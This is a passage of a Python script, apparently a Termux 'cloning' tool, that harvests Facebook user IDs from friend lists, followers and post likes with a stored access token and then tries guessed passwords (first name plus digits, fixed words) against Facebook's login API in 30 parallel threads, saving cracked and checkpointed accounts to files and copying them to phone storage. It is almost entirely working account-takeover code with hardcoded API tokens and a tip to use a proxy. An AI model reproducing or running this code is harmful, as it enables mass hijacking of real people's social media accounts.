	print('\033[1;97m[\x1b[1;93m✓\x1b[1;97m]\033[1;92m Total\x1b[1;93m CP \033[1;91m/\033[1;92mOK\033[1;93m:\x1b[1;97m\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\n\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
		
def indiaa():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	os.system("python3 .loading.md")
        time.sleep(1)
        os.system('clear')
        print logo
	kgf ("If you from india, First Use USA proxy to Cloning")
	print("\033[1;97m--------------------------------------------------")
	print ("\033[1;92m[\033[1;90m1\x1b[1;92m]\033[1;90m==\033[1;92m> \033[1;91mCrack From Friend List")
	print ("\033[1;92m[\033[1;90m2\x1b[1;92m]\033[1;90m==\033[1;92m> \033[1;91mCrack From Public ID")
	print ("\033[1;92m[\033[1;90m3\x1b[1;92m]\033[1;90m==\033[1;92m> \033[1;91mCrack From Followers")
	print ("\033[1;92m[\033[1;90m4\x1b[1;92m]\033[1;90m==\033[1;92m> \033[1;91mCrack From Page/Group/ID Post")
	print ('\033[1;92m[\033[1;90m0\x1b[1;93m]\033[1;90m==\033[1;92m>  \033[1;91mBack')
	print("\033[1;97m--------------------------------------------------")
	indiaa2()
def indiaa2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			indiaa()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="4":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\nPress Enter To Back")
			indiaa()
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		bangla2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m The Process Is Running In Background\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m To Stop Process Press CTRL Then Press\033[1;91m z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="556677"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;94m[\033[1;97mCheck-Point\033[1;94m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="102030"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"123456"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                 print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass6+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                 cp=open("cp.txt","a")
		                                                 cp.write(uid+" | "+pass6+"\n")
		                                                 cp.close()
		                                                 cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass6+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)

									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
	print('\033[1;97m[\x1b[1;93m✓\x1b[1;97m]\033[1;92m Total\x1b[1;93m CP \033[1;91m/\033[1;92mOK\033[1;93m:\x1b[1;97m\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\n\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
		
def hacker():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(1)
    os.system('clear')
    print logo
    print("\033[1;97m[1]\033[1;90m==\033[1;92m>\033[1;95mRandom Indonisia Frienlist Cloning")
    print("\033[1;97m[0]\033[1;90m==\033[1;92m>\033[1;95mBack")	
    time.sleep(0.5)
    print("\033[1;97m--------------------------------------------------")
    hacker_man()
def hacker_man():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        indo()
    if option =="0":	
          menu()
    else:
          print ("[!] Please Select a Valid Option")
          hacker_man()		
		  
def indo():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	print ("\033[1;97m[1]\033[1;90m==\033[1;92m> \033[1;97mCrack From Friend List")
	print ("\033[1;97m[2]\033[1;90m==\033[1;92m> \033[1;97mCrack From Public ID")
	print ('\033[1;97m[0]\033[1;90m==\033[1;92m>  \033[1;97mBack')
	print("\033[1;97m--------------------------------------------------")
	indo2()
def indo2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			indo()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		indo2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m The Process Is Running In Background\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m To Stop Process Press CTRL Then Press\033[1;91m z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"786"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="Kontol"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;94m[\033[1;97mCheck-Point\033[1;94m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5=name+"102030"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="556677"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                 print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass6+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                 cp=open("cp.txt","a")
		                                                 cp.write(uid+" | "+pass6+"\n")
		                                                 cp.close()
		                                                 cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass6+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7="Sayang"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass7+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass7+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
	print('\033[1;97m[\x1b[1;93m✓\x1b[1;97m]\033[1;92m Total\x1b[1;93m CP \033[1;91m/\033[1;92mOK\033[1;93m:\x1b[1;97m\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\n\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
	
if __name__ == '__main__':
    the_kgf()


